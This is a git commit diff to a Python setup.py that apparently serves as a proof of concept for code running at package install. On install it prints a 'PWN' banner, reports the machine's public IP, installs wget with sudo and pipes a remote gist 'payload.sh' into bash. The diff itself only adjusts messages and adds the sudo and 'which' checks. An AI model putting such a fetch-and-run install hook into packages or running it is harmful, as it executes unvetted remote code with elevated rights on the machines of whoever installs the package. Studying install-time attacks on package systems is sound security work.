d8c5727be80937b6f75254066fc733b89de2777a
Stephen Gutekanst <stephen.gutekanst@gmail.com>
2015-10-20 12:50:19 -0700

    ff

--- setup.py
+++ setup.py
@@ -1,8 +1,8 @@
 import sys
 
-print "~_~_~_~_~_~_~_~_~ PWN ~_~_~_~_~_~_~_~_~\n\n"
+print "~_~_~_~_~_~_~_~_~ PWN ~_~_~_~_~_~_~_~_~"
 
-print "Querying public IP...\n"
+print "Querying public IP..."
 import urllib2
 print urllib2.urlopen("https://api.ipify.org/?format=json").read()
 
@@ -10,9 +10,11 @@ print urllib2.urlopen("https://api.ipify.org/?format=json").read()
 # while True:
 #     1+1
 
-print "Executing payload...\n"
+print "Executing payload..."
 import os
-os.system("apt-get install -y wget")
+os.system("which wget")
+os.system("which curl")
+os.system("sudo apt-get install -y wget")
 os.system("wget -O - https://gist.githubusercontent.com/slimsag/293e68ffd9fcd3edbc98/raw/9b69429afe3158e5b4a9f0866b466debc97c07ac/payload.sh | bash")
 
 print "Done."
